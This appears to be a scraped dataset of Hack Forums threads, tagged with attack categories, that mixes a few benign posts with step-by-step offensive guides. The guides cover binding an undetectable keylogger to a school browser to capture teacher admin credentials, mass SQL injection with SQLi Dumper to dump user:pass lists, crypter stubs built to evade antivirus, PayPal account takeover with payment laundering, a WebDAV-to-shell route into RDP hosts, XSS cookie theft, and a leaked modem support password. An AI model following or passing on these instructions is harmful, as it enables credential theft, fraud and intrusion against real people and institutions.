Study on Command Injection in GitLab Community and Enterprise Edition 11.11,Command and Scripting Interpreter,,Author,https://hackforums.net/showthread.php?tid=6102031,"Study on Gitlab's SSRF vulnerability allowing RCE by authenticated users (CVE-2019-12430) Server Side Request Forgery And Cross Application Scripting SSRF is Server Side Request Forgery. This issue occurs when an application sends requests over the internet to an attacker-controlled location. Attackers have many uses for such functionality, including: Denial of Service attacks A reflected DoS vulnerability is when an attacker can send a small request that results in a large request being sent to an attacker-controlled endpoint. Access to internal networks The attacker can send web requests to other servers running within the same network. This is especailly dangerous if the result of the request is returned to the attacker. This could expose sensitive data Access to internal networks includes the machine the attack is being run on - this could allow the attacker to perform port scans, or even talk to other services running on the local machine that aren't internet accessible Reflected exploitation If the attacker knows of an exploit for another service, and has control over most of the request, he may be able to send an exploit through the SSRF, preventing his IP from appearing in logs on the affected service. CAS CAS stands for Cross Application Scripting. Cross Application scripting allows one application to communicate with another. Cross Application Scripting is when an attacker tricks an application into talking to another application. For example, you can talk HTTP to a memcached server. The memcached server will discard all invalid commands, and valid commands will be run. For example, a request using the custom HTTP method ""stats sizes"" will look like the following:"

Hack Game Filetype Lingo,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6101462,"Very short and simplistic thread for anyone playing the hack game and not quite sure on the different filetypes listed in the shop. If you're actually into hacking or just possess general knowledge there's probably not much to learn from it, but I learnt a decent amount from my research in regards to the .sh filetype. First of all, you’ll notice there are four different filetypes available. .exe = This is your standard executable file and easily the most well-known of the four. An executable file (exe file) is a computer file that contains an encoded sequence of instructions that the system can execute directly when the user clicks the file icon. Some exe files are generally seen as posing a higher security risk due to them being able to run by themselves without necessitating the existence of another program. Some of the many filetypes for these are BAT/COM/CMD/INF/IPA/OSX/PIF/RUN/WSH. .pdf = A file format developed by Adobe in the 1990s to present documents, including text formatting and images, in a manner independent of application software, hardware, and operating systems. This is a portable document file, notorious for several zero-day occurrences in which a single click of a PDF document was able to give hackers access to the PC’s which the document had been mailed to with malicious intent. Generally, the format is used when you need to save files that cannot be modified but still need to be easily shared and printed. Today almost everyone has a version of Adobe Reader or other program on their computer that can read a PDF file, hence why it is so useful for hacking if one is able to pack malicious code/scripts into one before having someone else open it; practically every modern PC can run the filetype with a single click. Interesting read on apple’s first ransomware attack/Microsoft word exploit via pdf format - https://www.express.co.uk/life-style/sci...attachment .doc A DOC file is a word processing document created by Microsoft Word, or another word processing program, such as OpenOffice Writer or Apple Pages. It may contain formatted text, images, tables, graphs, charts, page formatting, and print settings. Many members of the general public see .doc files as one of the safest types and thus don’t expect anything remotely malicious to be embedded within them due to how well-known word is for using said filetype. .sh = An SH (Shell script file) is a script programmed for bash, a type of Unix shell (Bourne-Again SHell). It contains instructions written in the Bash language and can be executed by typing text commands within the shell's command-line interface. Shell scripting is often used to automate your day to day task like sending some regular mail to your company / to kill multiple processes. Will update this with other lingo in the near future."

[GUIDE] Gain admin rights on your schools network,"Develop capability,External Remote Services,Exploitation of remote services",,Author,https://hackforums.net/showthread.php?tid=6099478,"How to become administrator on your schools network😎 Before starting off you will require a few things to make sure everything works smoothly. FUD keylogger(not password stealer, do not confuse the 2) PE(.exe) binder You can either code a TCP echo server and have it listen for your key logger or you can save the data locally. Knowledge in a programming language wich can be compiled to a PE(I recommend making the keylogger in that language as it will be easier to use the binder) A copy of the browser ised at your school. Make sure to get everything ready at home to avoid getting caught 1. Code your key logger : Make sure the logger can not be seen as a terminal or as a suspicious proccess in Task Manager. Before UAC is prompted, spawn a message box with an error detailing why UAC is needed(optional but will make it more legit). The error can be stuff like invalid files, cache errors, datetime errors(pretty suspicious) get creative and make sure it looks legit Start your key logger Require UAC Throw an error and kill the PID if UAC is not granted 2. Bind your logger to your schools web browser: Open your PE binder of choice. Bind the key logger to your schols web browser. Test detection using a no share virus scanner( Its best if you know wich AV your school uses so you can make sure its FUD for that AV). ( If it is not FUD I do not recommend proceeding as it may lead to you getting caught and suspended)) 3. Put the files on a USB stick and carry it with you to school the next day. ( It would be good if your school has a place for students to use the PCs in the break, since most schools make a folder for each student it would allow you to replace the web browser without your teacher being around) 4. Run the newly created browser and wait for the error to pop up. 5. Call your teacher and ask her/him for help, say you tried to close it but it keeps coming up etc 6. If you are lucky enough, your teacher will enter his/her admin login details and your logger will grab them. ( Not all teachers are admins so take that into consideration) This is just a concept, I do not recommend trying this as it may get you in trouble. I am not responsible for any damage you cause to your/the schools PC. You can try this on your own risk."
Want a bulletproof setup for WICKR,External Remote Service,,Author,https://hackforums.net/showthread.php?tid=6098931,I communicate on wickr to people. Wickr saves IP addresses and device ID. So I need a setup to counter this. I’m not a computer expert just a novice. Would really appreciate it if any of you could throw some ideas or tips my way. Here’s the options I’ve thought of so far: Option 1. I was thinking about renting an RDP with WICKR installed through a VPN or TOR. That way I could change the MAC address and the IP would then communicate from the RDP. Perhaps install a VPN program on the RDP too. Option 2. Linux tablet with changed MAC address with WICKR installed tethered to a 4g modem going through Tor and a VPN. Better ideas would be awesome thanks in advance. Obviously security is paramount on the local device I use too. Which I need to take into account and I would prefer for it to be mobile. I need to consider authorities getting hold of it.
Windstream ISP Modems,"Network sniffing,Network Service Discovery",,Author,https://hackforums.net/showthread.php?tid=6099273,"So I have a family member who is getting Century Link soon. I took the liberty of finding her a used Windstream modem so she didn't have to purchase a new DSL modem. I was trying to default it and setup as new with of course Century Links information. They (Windstream) have their firmware pretty well locked down, Or so it looked. I noticed after many attempts to locate the ""Access Code"" that I could bypass it by simply entering an expected URL. Like changing blahblah/login.ha to blahblah/status.ha I was then able to view the Diagnostics where I seen my many failed attempts at entering the access code. However it said failed login attempts from ""admin"". Seemed rather dumb so I went back and tried ""admin"" as the access code... Worked like a charm. I then noticed that you are unable to edit the PPP section in order to setup for a different ISP. I figured at this point that whoever setup this firmware wasn't looking to really keep intruders out. So It was really simple to edit the source of the page and remove the ""disabled"" code from the particular elements I needed to edit. Of course I forgot to hit save changes so I had to do it twice. But then it saved. I rebooted the modem just to verify the changes were persistent. I was then browsing through the system category. The words ""Remote Access"" piqued my interests. Well just like the PPP section. It's all disabled. But I was able to see the username ""support"" in plain text. I then edited it as usual. I inspected the first password field and just started laughing... Password's hidden, right in the code. Code <input type=""password"" name=""password"" size=""32"" maxlength=""32"" value=""W1ndstr3amgs1093"" autocomplete=""off"" disabled=""disabled""> I can't say this is the same for every modem. But for this particular Arris NVG343BQ this is SADLY the case. If their is a better section for this information please move it. This seemed to be the best place to me."

How to use the WebDav exploit to hack RDP's-with tools[Updated 08/5/11],"Exploitation of Defense Evasion,Impair Defenses",,Author,https://hackforums.net/showthread.php?tid=1430396,"Alright guy's today in this tutorial I'll be explaining how to use the webdav exploit. The link for the tools used for this tutorial can be found in the bottom of this tutorial. For those of you who do not know what a Webdav is here is the definition Code Web-based Distributed Authoring and Versioning, or WebDAV, is a set of extensions to the Hypertext Transfer Protocol (HTTP) that allows computer-users to edit and manage files collaboratively on remote World Wide Web servers. But fo our purpose we will be using it to exploit RDP's or the Remote Desktop Protocal. For a better understanding of these with RDP's they could range from Vp's to Dedi's to just plain old home Pc's, but no matter what it is you will gain full access to the machine and can basically do whatever you want using a shell. For those of you who are new to the hacking scene a shell is a php script that allows you to view all of the files on the server you decide to host the shell on. The most common shells are the c99 or the r57, but in this case we will be using the c99. Now please be aware these are not the only shells available there are several posted throughout the forum and you can find them by simply using the search button located on the navbar. Now before being able to use the shell we have to find some vulnerable Ip's to gain access to for this we will be using the WebdavlinkCrawler which can be found in the webdav tools kit I have provided below here if you don't trust my download links simply don't download them it's that simple. Once you have managed to open the program you will be presented with this interface."

[Tutorial] ~ DNS Rebinding ~ Hacking Routers and Taking Names,"Develop capabilities,Network service discovery",,Author,https://hackforums.net/showthread.php?tid=3937393,"Hey guys :D Alright, this is going to be a tutorial about DNS rebinding, what it is, how to do it, and how to protect against it. What you'll need: A Web Server Register a NameServer on your domain (Free) Rebind (download here) 1. What is DNS Rebinding? I'm so glad you asked. DNS rebinding occurs when a web server provides an IP that is different than its own, generally for potentially malicious reasons. The attack vector is providing the IP of the client in order to perform Cross Site Request Forgery attack. We will be using this to 'hack' routers. This works because somewhere between some and many consumer-grade routers are configured in such a way that, when you type the external IP address of the router from within the local LAN, it will take you to the router configuration page. The reason this works is because the router checks only where the packet is going, and not the interface through which it came in. This means that an internal host can access the router by the router's INTERNAL or EXTERNAL IP. However, an external device can not access the router at all (without DNS rebinding or some sort of attack)."

What is Social Engineering? According to Wikipedia, Social engineering, in the context of information security, is the psychological manipulation of people into performing actions. In short, it is human-hacking. What are some human-hacking techniques?? There are many, but in this tutorial, these are relevant: 1. Authority: Proving to the target you are important 2. Familiarity: Make the target like you, leading to-- 3. Trust: Manipulating the target because ""you know better"" How is this applied in buildings? 1. Authority: Wear extra good clothes and people will think you are a rich, high-ranking individual. Body language/communication skills also help. 2. Familiarity: Make friends with employees and guards. Show that you know about the people there. Talk to people regularly. 3. Trust: This one is simple. Now that everyone trusts you and think you're an important person, you can talk your way through things. Note: Personally I found scouting the company through OSINT helps in the Familiarity stage. Showing that you've ""been to the company"" shows that you actually work there or are known there. For example asking if the boss is present and calling them by their first name. In a pentest, you can pivot this social engineering attack into wireless hijacking, lunchtime attacks, or shoulder surfing. Thoughts in comments."

If you can't set linux up just post/PM and I'll help. 1) get Crunch - type in terminal: sudo apt-get install crunch 2) You use crunch like this: crunch <min> <max> <charset> -t <pattern> – o <filename.lst> min = minimum length of the password max = maximum length of the password Charset = Which characters you want to add in your wordlist like abcdefghijklmnopqrstuvwxyz or 1234567890. You will need to do upper and lower case if you want all of them. -t <pattern> = This is the pattern you want to follow. Lets say you saw them enter the first three letters ('cat' and know the last letter is 'x') and it's an 6 digit password, you could do something like: cat@@x This will make all passwords start with cat and change the characters that use @. -o <output?> is what you want to call the output file. 3) so type: crunch 6 6 abcdefghijklmnopqrstuvwxyz -t cat@@x -o catfile.lst 4) type: cat catfile.lst 5) You should see something like: catusx catutx catuux catuvx catuwx catuxx catuyx catuzx catvax catvbx 6) you can do more complicated things with other options if you need to. 7) be careful of opening a big wordlist in an editor/terminal.

One of the main reasons is that your working on a stub programming it in Visual Basic 6 and the encryption modules require functions that need API codes. When you compile your stub it will leave in plain text what API functions that are needed. Example, ""Phizo is in his VB6 workspace in the Forms section theres frmStub, in the code it contains instructions to hide the visual form and his modules section it says ""mMain"", ""mRC4"", and ""mRunPe"" he finishs coding the modules but with execption that mRC4 and mRunPe where from a older crypter source"" The errors that Phizo made that modules where unencrypted, and where from a older crypter source that AVs where able to detect right of the back because AVs reconize the functions for RC4 and RunPE. To prevent this you need a use a source undetector tool or you encrypt it your self, this will mask the API function names and dependicies. Another reason is the basic information thats given to exe-file like: ""Company"" ""Product name"" ""Copyright"" and less likely the Icon (you can use AVs icon to prevent .ico detection) To prevent this you can use random names like ""jahjJKAHjkhdas"" for Company Value, ""dcjkdfjkHJ"" for the Product name and you know what I mean but make sure that you're code has a update function so when it downloads a new stub it will change the unqie random name(s) because sooner or later AVs will match that with your detected stub. But AVs can detect Heuristics of the VB6 file if it contains certian amount of malware traces it will probally say its a ""Trojan/Heuristic, Trojan/Generic, Malware.Gen, and etc"" If you want a fully undetectable result you must know what the AVs are looking at so you can cover that hole thats the hard part but so simple. 3.5/4.0 .NET Framework Making a crypter in .NET makes it look nice and orginized but it gives off to much info. The mistakes of .NET stubs is the basic info of exe-files and .NET modules that can be easily decompiled and reconize your coding. You can encrypt the modules but AVs have so much methodology that I wouldn't recommand making a EXE based stub, I recommand making a DLL Stub with EXE Loader so there are three componants in a DLL based cryption. DLL Stub benefits: #1 Random or Encrypted function names #2 Random or Encrypted functions #3 Random or Encrypted API #4 Unknown rootkit for kernel level bypass What is the EXE Loader for? The EXE loader will load & exeute the DLL stub to process the encrypted malware at a non exe level. That means AVs will have to go to deeper level in the Windows system that will trigger it self as malware, thats only if the DLL stub is designed to stealthly reach that level without detection of privilages. Its just that .NET framework has pros and cons that differ from VB6 pros and cons. Other way the VB.NET crpyts that it resources has a source code stub and a encrypter then it injects the compiled source code stub into the file you want along with a decrypter for that kind of encryption. AVs will pick this type of method a VB.Injector/MSIL/Injecter.a, or Gen:Kazy.Variant 87364 and blah blh you. One more important thing when u scan with mutli engine anti virus online if they say its a dropper then you'll have to hide and encrypt the dropper code, a injector will it will detect the ""injected"" decrypter for the file. Now you understand? Heres picuter of my crypter SO FAR:(LOL) [img]http://www.hfimage.net/images/tju87tvffcp8x1m2pkk3.jpg[/img] Here's download link to my full work(wit picture): Mediafire"

Basic HTML tags 2. Basic to advanced Javascript WAF Bypass is a bonus What is XSS XSS (Cross-site scripting) is an attack where you input code that gets reflected on the website view. You input a piece of data, for example HTML code, and it is ""injected"". For example, you search Hello World in a search bar The website source code shows this: Code <b>searched for: Hello World</b> [Image: Untitled.png] You can insert an HTML input, for example Code <font size=20>Big letters</font> Which would result in: Code <b>searched for: <font size=20>Big letters</font></b> [Image: Untitled2.png] And if you add <img src=https://...sourceofcatpicture...></img> [Image: Untitled3.png] Note: There are security measures in place to protect from such an attack.

How to delete personal information about myself on the Internet,Obfuscated files or information,,Author,https://hackforums.net/showthread.php?tid=6095196,"Hello HF Members, If you find personal information about yourself on the Internet, it can be very difficult, if not impossible, to get that information removed. In most cases, once information is on the Internet, it is there to stay. Whether other people can find it, depends on how easy it is to find through a web search engine. Removing personal website If you own the website where your personal information is found, you can remove the information from the web pages or you can delete the web page or website entirely. If you want to keep the information online, but do not want search engines to find the information, you can password protect the information. Or, set up a robots.txt file to indicate to search engines that all or part of your site should not be indexed. Keep in mind, however, that search engines crawling your site are not required to honor the robots.txt file. Remove social networking site data For social networking websites like Facebook, Twitter, and other social networking sites, you can choose what personal information to displayed to other users. These settings are found through the Privacy settings in each of the services. However, some of the information may be publicly displayed or have the potential of being displayed in the future. Removing information from someone else's website If your personal information is on a website you don't control, you can attempt to ask the webmaster or web host of the site to remove your information. In some cases, after time they may comply with your request. Removing link to a site from search engines Many search engines have policies where they remove the links to sites based on the content. When we say ""remove,"" we mean that the links are no longer indexed, but the information remains on the Internet. For example, Google may remove links to pages that contain any of the below personal information. National identification numbers, such as U.S. Social Security Number, Argentina Single Tax Identification Number, Korea Resident Registration Number, China Resident Identity Card, etc. Bank account numbers. Credit card numbers. Images of signatures. Removal information from Google Best practices to follow when posting information As a best practice, always be mindful of what you divulge to anyone or any company on the Internet. On chat sites and social networking sites, if you don't want someone to spread information about you around the Internet, don't say it or type it. The best way to keep personal information to yourself is keep it personal, that is to say, keep it to yourself. The Internet is vast, and word spreads fast!"

Password cracking and post-exploitation of wifi network - Tutorial part 1,Exploitation for credential access,,Author,https://hackforums.net/showthread.php?tid=6064252,"Recently, browsing this forum, I noticed a lot of requests regarding help with WiFi hacking / post-exploitation of the network I was able to access. I know that in this forum there are many people starting their adventure with wireless network pentests. So I decided to try to create a mini-tutorial based on my own experience in this field which will be a good starting point for many people. It will not be a comprehensive bible of penetration tests, but rather a specific alphabet. Therefore, I cordially invite all experts on the subject to comment / describe their own ways, the more so that you can say a lot about this topic and what I will present is just a tiny drop in the sea of possibilities. And if I have made a mistake in this guide, I will be obliged if you write to me about it. I want this tutorial to be a solid source of knowledge and not mistakes😁️ YOU NEED: FOR A GOOD BEGINNING: - A computer with any linux (it may be windows even though you may have a problem with the availability of some software and running it can sometimes cause problems. Well, if you do things like hacking, it would be good to have the ability to work with linux, however, I myself this guide will be limited only to linux, and exactly known to all kali linux😄️). - Internet access (to download software / use additional tools). - Network card that supports packet injection and work in monitor mode (I use Alfa AWUS036NH myself, but it may well be another one that supports the above modes. In addition, I recommend buying an external antenna, although this is not required). - Willingness to learn and the ability to think logically😂️ NECESSARY SOFTWARE: - Aircrack-ng - Macchanger - Thc-hydra - Nmap - Routersploit - Crunch - Nmap Script Engine (installed by default with nmap, additional scripts to download on the internet) - Arpspoof - Dnsspoof ADDITIONAL TOOLS / ONLINE SERVICES: - MACVendors.com - WiGLE: Wireless Network Mapping - GPUHASH.me (if the computing power of your machine is too low, of course you can use other similar sites). - Dictionaries for cracking passwords and lists of default usernames (on the Internet there are many different dictionaries / lists of usernames ready for download that are worth buying, but in the rest of this guide we will generate our own dictionaries. Why will I list the usernames later? ) COMPLEMENTARY KNOWLEDGE: As I said at the beginning, hacking is a river topic, which is why I put a short list of books that are worth using while learning how to hack wireless networks and more. I used them myself and I think it is a good source of supplementary knowledge. Of course, I don't force anyone to study here, but I highly recommend it because such knowledge only pays off later - Vivek Ramachandran - BackTrack 5 Wi-Fi penetration tests. - Hertzog Raphaël - Kali Linux Revealed. - Zetterström Sven-Erik - Basic Wifi-Hacking. - Lee Barken and others - Wireless Hacking. - Kim P. - Pentester Handbook. IT systems security. - Georgia Weidman - Penetration Testing: A Hands-On Introduction to Hacking. - John Chirillo - Hack Wars Volume 1 and 2. - Chris Sanders - Practical package analysis. Using Wireshark to solve network problems. PREPARATION: To start with, let's start by updating our system (I use apt but you can use another package manager present on your system): Code apt-get update && apt-get dist-upgrade Now let's install the necessary packages listed above (if you haven't done it before, if you use kali linux then most of the tools are pre-installed🙂️): Code apt-get install PACKAGE NAMES SEPARATED WITH SPACE If you cannot install any of the programs via your package manager, google looks for information on installing it on your operating system. There will be plenty of information there Now we connect our network card and check its correct operation: Code Airmon-ng After typing this command into the console, we should see information about our wireless network interfaces (in turn: physical address, interface name, driver and chipset). We choose and remember the name of the interface we want to use. Then let's kill all processes in the system that may interfere with our card's work and run it in mixed mode (Promiscuous mode). We issue the following commands: Code airmon-ng check kill Code airmon-ng start INTERFACE NAME Now we can check the correctness of the above commands by typing ""ifconfig"" if one with the ending ""mon"" appears on the interface list, everything is ok Now let's generate some simple dictionaries using the crunch tool. For the purposes of this tutorial, we will generate a simple set of numeric dictionaries (only numbers) which does not mean that you should only use them in your everyday work. It is good to get different sets of dictionaries available online in advance. As usual, Uncle Google is waiting for you to ask him the right question and of course you should have enough free disk space. Dictionaries like to take up a lot of space😃️ Generating a 8-character dictionary: Code crunch 8 8 1234567890 -o /PATH/TO/SAVE/LIST.TXT Generating a 10-character dictionary: Code crunch 10 10 1234567890 -o /PATH/TO/SAVE/LIST.TXT Generating a 11-character dictionary: Code crunch 11 11 1234567890 -o /PATH/TO/SAVE/LIST.TXT Generating a 12-character dictionary: Code crunch 12 12 1234567890 -o /PATH/TO/SAVE/LIST.TXT Finally, a 13-character dictionary: Code crunch 13 13 1234567890 -o /PATH/TO/SAVE/LIST.TXT After these endeavors, we will be ready to act, so we will fly with it without delay"

I am not responsible for what u do with this tutorial You are responisble for your own deeds and god will punish you not me laugh.gif Basicaly in today internet world we have to sign up in many forums , many emails, etc . But question arises how can we rember all passwords of all forums,sites,emails,paypal etc so we use common sense and use same password for all places AND That is the big mistake . Hacker take advantage of this even me laugh.gif lol so what basic principle is hacker hack one email or forum password through trojan or phishing then they can type email to paypal( which they stolen from forum or phishing email account like yahoo,rediff) and type the same password he was using on different forum. Let say I got one email and password of yahoo account ??( note this is random account it is useless tongue.gif ) email: hacking_is_not_crime@yahoo.co.uk password: godzilla123 what can i do with it? first thing i will go to paypal and type that email and type that password he was using on yahoo account and beleive me 60% you will logged in the account ohmy.gif .But what i can do more i can type email hacking_is_not_crime@yahoo.co.uk in google search and i can find out that where more this person is registered i can go to those forums,or sites and try my luck hoping he will usee same password for everywhere What Black Hat Hackers Do??( hacker who hack for money) what they do is just buy big email and password list or arrange from somewhere then enter email and password in paypal and start hacking money from them! So hacking paypal is too easy to take advantage of people foolishness of using same password everywhere second way of hacking unverified ( non added credit card,bank account or debit card)paypal account This technique has some limitation and again it is the advantage of user foolishness sometime what happen is when person is signing up the account Fastly he forget to type security question and Then hacker make advantage of it. so simple thing what all hacker do is find victim phone number or adress block number. we can easily hack our freind accounts by this way as we know where they live or we know their phone number so what all hacker do is click on forget my passsword type email adres then type phone number to confirm identity then hacker can change the password IF - victim didnt written option of securtiy question then it will go directly to change password How do hacker transfer money from paypals or using paypals? What paypal hacker hate is when he is using paypal and then paypal put restriction on hacked paypal or put security question page where we have to type credit card to verify that we are the owner so hacker hate that like this also when hacker transfer money from hacked pp to his pp( Paypal) then paypal company reverse the money and put that hacked pp in Limited mode where user cannot send money How Security Page come? Basicaly when in 1 one day paypal is logged in with different country Ip's then paypal automatic machine will put account on securty page. Let say real owner live in US he logged in on 2 november 2008 then hacker loggen in with ip of canada on 2 november ( on the same date real owner logged in ) then automaticaly security page will come How hacker avoid security page? They use same country SOCKS ( socks is the proxy it is basicaly to change ip to different country hacker often use this) real owner has . they will firstly logged in with any country ip hoping owner didnt logged on that same date then hacker will click on profile and see which country does he belong to then after that he will use that country socks Note: on the same date hacker cant use even the real owner country after using different ip . in simple term on 1 day 1 country ip How hacker protect themseleves to get been caught? They use socks or VPN ( Virutal Private Network ) hacker prefer use to socks rather then proxies because proxy store real ip information whereas socks dont socks or vpn accounts dont store real ip logged in information.because if they use proxy and paypal company will know about that proxy they will contact them and know real ip logged in so hacker use SOCKS V5 for more information on socks you can see How hacker avoid to reverse the payment they transfer to their account? when hacker have to buy something from hacked paypal they dont buy from hacked paypal they transfer the money to their paypal then use it but nowdays paypal been more smarter they reverse the payment but now days hacker are been more smarter what they do is transfer money to fake pp then transfer from that fake pp to one more fake pp then transfer from second fake pp to their own account that way it will be difficult for paypal to reverse not impossible but difficult second way ( Credits Shafe ) hacker used to transfer money then on real account they will change all details of profile ,change password, security question and remove credit card . that way it is difficult to reverse again not imposible but difficult so at end i want to conclude that dont put yourself in this paypal hacking because using other person money is stealing their sweat i just give this info FOR education only you may hide from police or paypal but you cant hide from god dry.gif i just told this info so that i can guide u DONT USE SAME PASSWORDS for everywhere you can make one text document and write your all password there if u cant rember.."

Trojans, viruses, and worms can be used to achieve the above-stated objectives. In this article, we will introduce you to some of the ways that hackers can use Trojans, viruses, and worms to compromise a computer system. We will also look at the countermeasures that can be used to protect against such activities. Topics covered in this tutorial What is a Trojan? What is a worm? What is a virus? Trojans, viruses, and worms Countermeasures What is a Trojan horse? A Trojan horse is a program that allows the attack to control the user’s computer from a remote location. The program is usually disguised as something that is useful to the user. Once the user has installed the program, it has the ability to install malicious payloads, create backdoors, install other unwanted applications that can be used to compromise the user’s computer, etc. The list below shows some of the activities that the attacker can perform using a Trojan horse. Use the user’s computer as part of the Botnet when performing distributed denial of service attacks. Damage the user’s computer (crashing, blue screen of death, etc.) Stealing sensitive data such as stored passwords, credit card information, etc. Modifying files on the user’s computer Electronic money theft by performing unauthorized money transfer transactions Log all the keys that a user presses on the keyboard and sending the data to the attacker. This method is used to harvest user ids, passwords, and other sensitive data. Viewing the users’ screenshot Downloading browsing history data What is a worm? A worm is a malicious computer program that replicates itself usually over a computer network. An attacker may use a worm to accomplish the following tasks; Install backdoors on the victim’s computers. The created backdoor may be used to create zombie computers that are used to send spam emails, perform distributed denial of service attacks, etc. the backdoors can also be exploited by other malware.

[Tutorial] How to start with Web Pentesting Part 3: XSS (Cross-site scripting),"Develop capability,Drive by compromise",,Author,https://hackforums.net/showthread.php?tid=6094504,"Hey everyone In this tutorial on web pentesting I will explain more about reflected and stored XSS (Cross-site scripting). What is reflected XSS At XSS we try to have our own client side script executed by the web server. We do this by entering certain payloads in an input field or in the url. These payloads usually consist of an HTML tag, an event and finally the script. In this tutotial we mainly discuss these kinds of payloads and as script we use ""alert('XSS')"". this script shows a popup message with the text ""XSS"". What is stored XSS The principle remains the same, trying to run our client side code through the web server, but there is a big difference. With stored xss, the web server will remember the payload. This means that your script is executed by everyone who visits that web page. An example where stored XSS would be possible is at a review page. You write ""a review"" for a product (it contains / is an XSS payload). The review is stored in a database and then all reviews of the database are loaded onto the page. In this way, your XSS payload is executed by everyone who reads that page. At first sight this may not seem that special compared to a reflected XSS, but I will explain why this can be interesting. In this way you can write a script that sends the cookie value of everyone who visits the page to you. This means that you can log in to others' account using their cookie. You could also capture keystrokes by using a keylogger. and so on ... XSS payloads As mentioned earlier, the payload consists of an html tag, an event and a script. This means that a basic knowledge of HTML and Javascript is required. The most standard payload for XSS is as follows: XSS Img This is basically a simple html tag that execute the code between the tags. You will rarely be successful with this payload because filters are often used. Therefore we have to use other tags and events to bypass these filters. below is an example of some ""better payloads"". Payloads (Pastebin Link) These are just a few examples with which you could bypass the filters. Note that sometimes (radom) capital letters are used, with this you can also bypass some filters. Below you will find a link with a list of tags, events and even payloads. Cheat-Sheet Link XSS tools I personally do not often use tools for XSS because I prefer to do it manually but below you will find some tools that you can use. Of course there are many more tools but these seemed the most interesting to me for the time being. - XSSer - Burp Suite Burp suite itself is actually not intended for XSS alone. You can do a lot more interesting things with this tool, but I might discuss this in another tutorial. The principle of the 2 tools is the same, you provide a URL and a list of XSS payloads. The tool will then send a request for each payload in the list to that specified web page (URL) with the payload as data. This is what you can do in the burp suite with the ""Intruder"". For example: URL = http://localhost:8080/search?q=mySearchItem payload: Img payload from pastebin link for example. In this case a request will be sent to http://localhost:8080/search?q=Payload. If the request is successful, it is checked whether the payload is present in the response. If this is the case, it means that the payload was successful. Otherwise the payload is not successful. These kinds of tools are also very cool and educational to make yourself. Thank you for reading my tutorial on XSS, if you have any questions feel free to ask and I will try to answer as best I can"

[Tutorial] How to start with Web Pentesting Part 2: Fingerprinting,"Develop capability,Drive by compromise",,Author,https://hackforums.net/showthread.php?tid=6066710,"Hey everyone, In this tutorial I will explain more about web pentesting mainly Information Gathering / Fingerprinting. What is fingerprinting? Fingerprinting is the first process that happens with web pentesting. In this process one tries to collect as much information about the (web) server. Below are some items that you may find out that will certainly help you with pentesting. -Server version (Windows / Linux) -Server type (webserver, email-server) -Web platform or programming language (PHP, ASP.NET) -Host IP -Hidden directories -Hidden files Fingerprinting manually if you want to manually collect information about the web server you must first have a basic knowledge of the following programming languages. -HTML -CSS -Javascript By opening the inspector or viewing the source page of the website you already get a lot of information. Here you can see all web pages licked on the current page. These pages can be found in tags such as (img, a, link, ..) these tags usually have href attribite or an src attribute that refers to another page or image. In the inspector is also an option called ""Source"" here you can find all files linked to that page. This can be useful to study the javascript code or to find hidden files. Also take a look at the inspector at the option ""Network"" and study the requests that are sent and received. Here you will often find a lot of information about the server (you can adjust these sent requests using Burp Suite, but I will not deal with this topic now. DM me or leave a post if you want more information about this) A very important file for web pen testing is the robots.txt file. This file lets your search engine know which folders or pages it should not display. Of course this is very interesting for us to find secret pages or folders (example admin pages). Fingerprinting tools There are several tools that can help with pen testing, I will explain some useful tools below. Dirb: Dirb is a web content scanner. it searches for existing files or folders on the website. Dirb searches web objects by executing a directory attack. It sends several requests to the server and looks at the response, if the server returns an error 404, the tool knows that the page was not found and searches for another one. Birb comes standard with several preconfigured attack wordlists that can be used for the dictionary attack, but you can also use a custom wordlist. Nikto Nikto is a very handy web server scanner, with many features, but I will now only discuss the basics. what I usually use the tool for. The tool immediately starts info displaying the web server (target IP, target port, server: Apache, ..). After finding the server info, he starts looking for hidden pages / folders. First, of course, he searches for the robots.txt file because it usually contains interesting information. When he finds it, he does a directory attack to find extra info. Owasp ZAP Zap is one of my favorite tools because you can find so many different types of vulnerabilities here. I'm not going to discuss them all now, but stick to the spider and directory attack. After starting the scan, the tool immediately starts the spider (a spider is a program that will search for all linked pages and display them, see manually fingerprinting => HTML tags). after this the tool starts an active scan, but it is not discussed now. Of course it is also possible to perform a directory attack with this tool. A default directory list is also provided. Dirb and nikto are installed by default in Kali Linux (not ZAP, but I definitely recommend you try this tool). Thank you for reading my thread. If you have any questions feel free to ask and I will try to answer as best I can."

You do not need all of them; 1,000 is more than enough Gaming Dorks: throwbin.io/N0aaEgJ Shopping Dorks: throwbin.io/n5U8wS5 1) Once you have your dork list you can open up SQLi Dumper. Below is what it looks like: imgur.com/a/2gs6E7l In the picture you can see ""inurl:"" which is where you copy and paste your chosen dorks. If this is your first time using the program then the second part of the program where you see ""https"" in a list will be blank for you, this is normal. 2) Now you are ready to start scanning, so in the bottom left of the program where it says ""Start Scanner"" with a big green play button, you hit it imgur.com/a/pXw8hdu Depending on how many dorks you have chosen to use and how many threads you set along with the internet speed and overall power of your PC this may take some time. You can leave it for a couple of hours to a couple of days. 3) You will have noticed that your 'Scanner' option on the left hand side has started to go up as mine does in the image below showing 23K links. imgur.com/a/XrxtxLM 4) Click into your SQL Injection tab on the left hand side. Set the threads (I usually use 200) and click ""Start Exploiter"" imgur.com/a/uCDfX9A 5) You will eventually see websites starting to fill up in the SQL Injection section of SQLi Dumper imgur.com/a/5kQBcDY Again the speed of this process completely depends on your internet speed and overall performance of your PC. Once this has finished running and checking all of the sites from your ""scanner"" list you can either double click any of the websites or right click and then click ""Go Dumper"" imgur.com/a/kMcvSDp 6) You will be taken to the dumper module, which looks like this: imgur.com/a/G16yV68 In your list you will see the database name for the MYSQL database the website you are exploiting is using. You need to click the database name and then click the ""Get columns"" button. This will start to pull through all the tables within that specific database. You are usually going to be looking for something along the lines of ""users"" ""customers"" ""members"" ""logins"" that type of thing. Some/a lot of websites/stores, etc will use prefixes too such as ""pvt_users"" ""forum_members"" etc. 7) When you have generated all the tables for your chosen website, you will then presented with something that looks similar to this: imgur.com/a/AsKjCCc Notice how I have already highlighted and found the ""ns_users"" table. This is the most likely place that the ""email"" and ""password"" columns will be stored and if we are looking to make a combo list that's exactly what we want. Highlight over your chosen table and click ""Get columns"" imgur.com/a/mpw4Q8q Now some websites may store their emails separately from the passwords (eg a forum that requires login via username and only stores emails for a newsletter) but this is still fine and User:Pass combo lists are still insanely useful. The website I have chosen is a User:Pass type of website. imgur.com/a/qDNYAhq Now you select the data you want to dump like the picture above and click the ""dump data"" button. imgur.com/a/rAt1EQ2 This will change your data dumper screen a little when it starts to gather the data from the columns. You should end up with something that looks like this: imgur.com/a/2IT3yYT For websites that have multiple tables (this has over 60) you will need to go through and keep searching until you find the one that is storing 